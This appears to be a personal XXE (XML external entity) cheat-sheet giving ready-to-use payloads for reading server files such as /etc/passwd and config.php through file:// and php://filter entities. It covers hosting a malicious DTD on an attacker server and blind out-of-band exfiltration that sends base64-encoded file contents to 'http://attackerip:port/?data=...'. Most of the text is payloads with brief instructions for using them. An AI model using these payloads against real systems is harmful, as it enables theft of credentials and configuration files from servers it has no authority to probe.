# XXE - XML eXternal Entities 

Tags : 


XXE occurs when user input is taken as xml and not using any protections

## Encodings
```xml
% = &#x25;
& = &#x26;
' = &#x27;
```

## Reading File Contents

we can create an entity in the internal dtd with pointing to the file name and we can use this in the xml tag field that gets reflected in the response 
Entity is just like variable in programming language and we can refer to any value

```xml
<?xml version="1.0" encoding='UTF-8'>
<!DOCTYPE test [
<!ENTITY pwn SYSTEM "file:///etc/passwd">
]>

<test>
<email>
&pwn;
</email>
</test>
```

we can also use php wrapper to get contents of php file 

```xml
<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=config.php"
```

we can use **CDATA** which is character data to get filecontents exactly without missing any characters 
like we can get contents of php file 
format of CDATA is

`<![CDATA[ ourfilecontents ]]>`

we can create two entities which hold left side of ourfilecontents and right side respectively
now lets use this 

```xml
<?xml>
<!DOCTYPE test [
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % filecontents SYSTEM "file:///etc/passwd">
<!ENTITY % pwn "<!ENTITY exploit %start;%filecontents;%end;>">
%pwn;
]>

<test>
<email>
&exploit;
</email>
</test>
```

above doesnot work because xml parser gives error when u include an entity inside parameter entity
solution is we have to host our dtd on webserver 
and we need to refer that in the internal dtd 
 
lets write our malicious.dtd
malicious.dtd
```
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % filecontents SYSTEM "file:///etc/passwd">
<!ENTITY % pwn "<!ENTITY exploit %start;%filecontents;%end;>">
%pwn;
```

in the internal dtd we can refer our 'exploit' entity 

```xml
<?xml version="1.0" encoding='UTF-8'>
<!DOCTYPE test [

<!ENTITY % dtd SYSTEM "http://attackerip/malicious.dtd">
%dtd;
]>

<test>
<email>
&exploit;
</email>
</test>
```

now you get the exact data , we can also get contents of php file 
try to get other php files like db.php or config.php etc


## Blind XXE with OOB 

if there is no xml tags in the server response then we cant see output 
in that case we can make server to make http requests to our webserver

we can also exfiltrate data in the get request to our server 

Making a simple get request

```xml
<?xml version="1.0" encoding='UTF-8'>
<!DOCTYPE test [

<!ENTITY % dtd SYSTEM "http://attackerip/">
%dtd;
]>

<test>
<email>
admin@gmail.com
</email>
</test>
```

this will make the get request to the webserver 
if you see the request then you can start extracting data 

like in the previous case , we will host our malicious dtd on our server and we change entity to make get request along with the data
we will encode file contents in base64 as it will be easy to send 

malicious.dtd
```
<!ENTITY % filecontents SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % pwn "<!ENTITY exploit SYSTEM 'http://attackerip:port/?data=%filecontents;>">
%pwn;
```

now we can refer the exploit entity in our xml data same like previous
```xml
<?xml version="1.0" encoding='UTF-8'>
<!DOCTYPE test [
<!ENTITY % dtd SYSTEM "http://attackerip:port/malicious.dtd">
%dtd;
]>

<test>
<email>
&exploit;
</email>
</test>
```

we can also make that entity a parameter entity 

malicious.dtd
```
<!ENTITY % filecontents SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % pwn "<!ENTITY % exploit SYSTEM 'http://attackerip:port/?data=%filecontents;>">
%pwn;
%exploit;
```

now you no need to refer this entity in xml data , just refer the dtd file and you will get the data

dont host webserver using netcat , host using python or php 

